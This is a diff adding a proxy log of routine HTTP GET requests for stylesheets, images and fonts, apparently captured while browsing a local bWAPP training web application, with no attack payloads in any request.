@@ -1,0 +1,3311 @@
+GET /css?family=Architects+Daughter HTTP/1.1
+Host: fonts.googleapis.com
+Sec-Ch-Ua: "Chromium";v="105", "Not)A;Brand";v="8"
+Sec-Ch-Ua-Mobile: ?0
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36
+Sec-Ch-Ua-Platform: "Linux"
+Accept: text/css,*/*;q=0.1
+Sec-Fetch-Site: cross-site
+Sec-Fetch-Mode: no-cors
+Sec-Fetch-Dest: style
+Referer: http://192.168.118.128/
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Connection: close
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/stylesheets/stylesheet.css HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/css,*/*;q=0.1
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/login.php
+Cookie: PHPSESSID=b185htodebvblhehaq9ur71vf2
+Sec-Fetch-Dest: style
+Sec-Fetch-Mode: no-cors
+Sec-Fetch-Site: same-origin
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/linkedin.png HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/login.php
+Cookie: PHPSESSID=b185htodebvblhehaq9ur71vf2
+Sec-Fetch-Dest: image
+Sec-Fetch-Mode: no-cors
+Sec-Fetch-Site: same-origin
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/blogger.png HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/login.php
+Cookie: PHPSESSID=b185htodebvblhehaq9ur71vf2
+Sec-Fetch-Dest: image
+Sec-Fetch-Mode: no-cors
+Sec-Fetch-Site: same-origin
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/twitter.png HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/login.php
+Cookie: PHPSESSID=b185htodebvblhehaq9ur71vf2
+Sec-Fetch-Dest: image
+Sec-Fetch-Mode: no-cors
+Sec-Fetch-Site: same-origin
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/favicon.ico HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/login.php
+Cookie: PHPSESSID=b185htodebvblhehaq9ur71vf2
+Sec-Fetch-Dest: image
+Sec-Fetch-Mode: no-cors
+Sec-Fetch-Site: same-origin
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/facebook.png HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/login.php
+Cookie: PHPSESSID=b185htodebvblhehaq9ur71vf2
+Sec-Fetch-Dest: image
+Sec-Fetch-Mode: no-cors
+Sec-Fetch-Site: same-origin
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/bee_1.png HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/login.php
+Cookie: PHPSESSID=b185htodebvblhehaq9ur71vf2
+Sec-Fetch-Dest: image
+Sec-Fetch-Mode: no-cors
+Sec-Fetch-Site: same-origin
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/bg_3.jpg HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/stylesheets/stylesheet.css
+Cookie: PHPSESSID=b185htodebvblhehaq9ur71vf2
+Sec-Fetch-Dest: image
+Sec-Fetch-Mode: no-cors
+Sec-Fetch-Site: same-origin
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/bg_2.jpg HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/stylesheets/stylesheet.css
+Cookie: PHPSESSID=b185htodebvblhehaq9ur71vf2
+Sec-Fetch-Dest: image
+Sec-Fetch-Mode: no-cors
+Sec-Fetch-Site: same-origin
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/sb_1.jpg HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/stylesheets/stylesheet.css
+Cookie: PHPSESSID=b185htodebvblhehaq9ur71vf2
+Sec-Fetch-Dest: image
+Sec-Fetch-Mode: no-cors
+Sec-Fetch-Site: same-origin
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/bg_1.jpg HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/stylesheets/stylesheet.css
+Cookie: PHPSESSID=b185htodebvblhehaq9ur71vf2
+Sec-Fetch-Dest: image
+Sec-Fetch-Mode: no-cors
+Sec-Fetch-Site: same-origin
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/netsparker.png HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/portal.php
+Cookie: PHPSESSID=mr5k2vp36buo1csesj66fiveg4; security_level=0
+Sec-Fetch-Dest: image
+Sec-Fetch-Mode: no-cors
+Sec-Fetch-Site: same-origin
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/zap.png HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/portal.php
+Cookie: PHPSESSID=mr5k2vp36buo1csesj66fiveg4; security_level=0
+Sec-Fetch-Dest: image
+Sec-Fetch-Mode: no-cors
+Sec-Fetch-Site: same-origin
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/mk.png HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/portal.php
+Cookie: PHPSESSID=mr5k2vp36buo1csesj66fiveg4; security_level=0
+Sec-Fetch-Dest: image
+Sec-Fetch-Mode: no-cors
+Sec-Fetch-Site: same-origin
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/owasp.png HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/portal.php
+Cookie: PHPSESSID=mr5k2vp36buo1csesj66fiveg4; security_level=0
+Sec-Fetch-Dest: image
+Sec-Fetch-Mode: no-cors
+Sec-Fetch-Site: same-origin
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/stylesheets/stylesheet.css HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
+Pragma: no-cache
+Cache-Control: no-cache
+Referer: http://192.168.118.128/bWAPP/login.php
+Cookie: PHPSESSID=eac12v9f7ittd842cv0l6qk6c3
+Connection: close
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/favicon.ico HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
+Pragma: no-cache
+Cache-Control: no-cache
+Referer: http://192.168.118.128/bWAPP/login.php
+Cookie: PHPSESSID=eac12v9f7ittd842cv0l6qk6c3
+Connection: close
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/blogger.png HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
+Pragma: no-cache
+Cache-Control: no-cache
+Referer: http://192.168.118.128/bWAPP/login.php
+Cookie: PHPSESSID=eac12v9f7ittd842cv0l6qk6c3
+Connection: close
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/linkedin.png HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
+Pragma: no-cache
+Cache-Control: no-cache
+Referer: http://192.168.118.128/bWAPP/login.php
+Cookie: PHPSESSID=eac12v9f7ittd842cv0l6qk6c3
+Connection: close
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/twitter.png HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
+Pragma: no-cache
+Cache-Control: no-cache
+Referer: http://192.168.118.128/bWAPP/login.php
+Cookie: PHPSESSID=eac12v9f7ittd842cv0l6qk6c3
+Connection: close
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/facebook.png HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
+Pragma: no-cache
+Cache-Control: no-cache
+Referer: http://192.168.118.128/bWAPP/login.php
+Cookie: PHPSESSID=eac12v9f7ittd842cv0l6qk6c3
+Connection: close
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/bee_1.png HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
+Pragma: no-cache
+Cache-Control: no-cache
+Referer: http://192.168.118.128/bWAPP/login.php
+Cookie: PHPSESSID=eac12v9f7ittd842cv0l6qk6c3
+Connection: close
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/blogger.png HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: http://192.168.118.128/bWAPP/login.php
+Cookie: PHPSESSID=m4gvg6v9lntp8lq3nsjf9ncgt0
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/linkedin.png HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: http://192.168.118.128/bWAPP/login.php
+Cookie: PHPSESSID=m4gvg6v9lntp8lq3nsjf9ncgt0
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/stylesheets/stylesheet.css HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/css,*/*;q=0.1
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: http://192.168.118.128/bWAPP/login.php
+Cookie: PHPSESSID=m4gvg6v9lntp8lq3nsjf9ncgt0
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/twitter.png HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: http://192.168.118.128/bWAPP/login.php
+Cookie: PHPSESSID=m4gvg6v9lntp8lq3nsjf9ncgt0
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/facebook.png HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: http://192.168.118.128/bWAPP/login.php
+Cookie: PHPSESSID=m4gvg6v9lntp8lq3nsjf9ncgt0
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/bee_1.png HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: http://192.168.118.128/bWAPP/login.php
+Cookie: PHPSESSID=m4gvg6v9lntp8lq3nsjf9ncgt0
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/bg_1.jpg HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: http://192.168.118.128/bWAPP/stylesheets/stylesheet.css
+Cookie: PHPSESSID=m4gvg6v9lntp8lq3nsjf9ncgt0
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/bg_3.jpg HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: http://192.168.118.128/bWAPP/stylesheets/stylesheet.css
+Cookie: PHPSESSID=m4gvg6v9lntp8lq3nsjf9ncgt0
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/bg_2.jpg HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: http://192.168.118.128/bWAPP/stylesheets/stylesheet.css
+Cookie: PHPSESSID=m4gvg6v9lntp8lq3nsjf9ncgt0
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/sb_1.jpg HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: http://192.168.118.128/bWAPP/stylesheets/stylesheet.css
+Cookie: PHPSESSID=m4gvg6v9lntp8lq3nsjf9ncgt0
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/favicon.ico HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: http://192.168.118.128/bWAPP/login.php
+Cookie: PHPSESSID=m4gvg6v9lntp8lq3nsjf9ncgt0
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/twitter.png HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: http://192.168.118.128/bWAPP/commandi.php
+Cookie: PHPSESSID=ifa3ssn53rppqa6dafhue99u46
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/stylesheets/stylesheet.css HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/css,*/*;q=0.1
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: http://192.168.118.128/bWAPP/commandi.php
+Cookie: PHPSESSID=ifa3ssn53rppqa6dafhue99u46
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/bee_1.png HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: http://192.168.118.128/bWAPP/commandi.php
+Cookie: PHPSESSID=ifa3ssn53rppqa6dafhue99u46
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/blogger.png HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: http://192.168.118.128/bWAPP/commandi.php
+Cookie: PHPSESSID=ifa3ssn53rppqa6dafhue99u46
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/facebook.png HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: http://192.168.118.128/bWAPP/commandi.php
+Cookie: PHPSESSID=ifa3ssn53rppqa6dafhue99u46
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/linkedin.png HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: http://192.168.118.128/bWAPP/commandi.php
+Cookie: PHPSESSID=ifa3ssn53rppqa6dafhue99u46
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/bee_1.png HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: http://192.168.118.128/bWAPP/commandi.php?name=abc
+Cookie: PHPSESSID=ifa3ssn53rppqa6dafhue99u46
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/facebook.png HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: http://192.168.118.128/bWAPP/commandi.php?name=abc
+Cookie: PHPSESSID=ifa3ssn53rppqa6dafhue99u46
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/blogger.png HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: http://192.168.118.128/bWAPP/commandi.php?name=abc
+Cookie: PHPSESSID=ifa3ssn53rppqa6dafhue99u46
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/linkedin.png HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: http://192.168.118.128/bWAPP/commandi.php?name=abc
+Cookie: PHPSESSID=ifa3ssn53rppqa6dafhue99u46
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/stylesheets/stylesheet.css HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/css,*/*;q=0.1
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/login.php
+Cookie: PHPSESSID=hlpl452umndfl69ppbg7gn0ah3
+Sec-Fetch-Dest: style
+Sec-Fetch-Mode: no-cors
+Sec-Fetch-Site: same-origin
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/twitter.png HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/login.php
+Cookie: PHPSESSID=hlpl452umndfl69ppbg7gn0ah3
+Sec-Fetch-Dest: image
+Sec-Fetch-Mode: no-cors
+Sec-Fetch-Site: same-origin
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/linkedin.png HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/login.php
+Cookie: PHPSESSID=hlpl452umndfl69ppbg7gn0ah3
+Sec-Fetch-Dest: image
+Sec-Fetch-Mode: no-cors
+Sec-Fetch-Site: same-origin
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/bee_1.png HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/login.php
+Cookie: PHPSESSID=hlpl452umndfl69ppbg7gn0ah3
+Sec-Fetch-Dest: image
+Sec-Fetch-Mode: no-cors
+Sec-Fetch-Site: same-origin
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/blogger.png HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/login.php
+Cookie: PHPSESSID=hlpl452umndfl69ppbg7gn0ah3
+Sec-Fetch-Dest: image
+Sec-Fetch-Mode: no-cors
+Sec-Fetch-Site: same-origin
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/bg_1.jpg HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/stylesheets/stylesheet.css
+Cookie: PHPSESSID=hlpl452umndfl69ppbg7gn0ah3
+Sec-Fetch-Dest: image
+Sec-Fetch-Mode: no-cors
+Sec-Fetch-Site: same-origin
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/bg_3.jpg HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/stylesheets/stylesheet.css
+Cookie: PHPSESSID=hlpl452umndfl69ppbg7gn0ah3
+Sec-Fetch-Dest: image
+Sec-Fetch-Mode: no-cors
+Sec-Fetch-Site: same-origin
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/favicon.ico HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/login.php
+Cookie: PHPSESSID=hlpl452umndfl69ppbg7gn0ah3
+Sec-Fetch-Dest: image
+Sec-Fetch-Mode: no-cors
+Sec-Fetch-Site: same-origin
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/bg_2.jpg HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/stylesheets/stylesheet.css
+Cookie: PHPSESSID=hlpl452umndfl69ppbg7gn0ah3
+Sec-Fetch-Dest: image
+Sec-Fetch-Mode: no-cors
+Sec-Fetch-Site: same-origin
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/sb_1.jpg HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/stylesheets/stylesheet.css
+Cookie: PHPSESSID=hlpl452umndfl69ppbg7gn0ah3
+Sec-Fetch-Dest: image
+Sec-Fetch-Mode: no-cors
+Sec-Fetch-Site: same-origin
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/mk.png HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/portal.php
+Cookie: PHPSESSID=f1smqpt14a55lejb92gbgepbl5; security_level=0
+Sec-Fetch-Dest: image
+Sec-Fetch-Mode: no-cors
+Sec-Fetch-Site: same-origin
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/zap.png HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/portal.php
+Cookie: PHPSESSID=f1smqpt14a55lejb92gbgepbl5; security_level=0
+Sec-Fetch-Dest: image
+Sec-Fetch-Mode: no-cors
+Sec-Fetch-Site: same-origin
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/owasp.png HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/portal.php
+Cookie: PHPSESSID=f1smqpt14a55lejb92gbgepbl5; security_level=0
+Sec-Fetch-Dest: image
+Sec-Fetch-Mode: no-cors
+Sec-Fetch-Site: same-origin
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/netsparker.png HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/portal.php
+Cookie: PHPSESSID=f1smqpt14a55lejb92gbgepbl5; security_level=0
+Sec-Fetch-Dest: image
+Sec-Fetch-Mode: no-cors
+Sec-Fetch-Site: same-origin
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/images/facebook.png HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/portal.php
+Cookie: PHPSESSID=f1smqpt14a55lejb92gbgepbl5; security_level=0
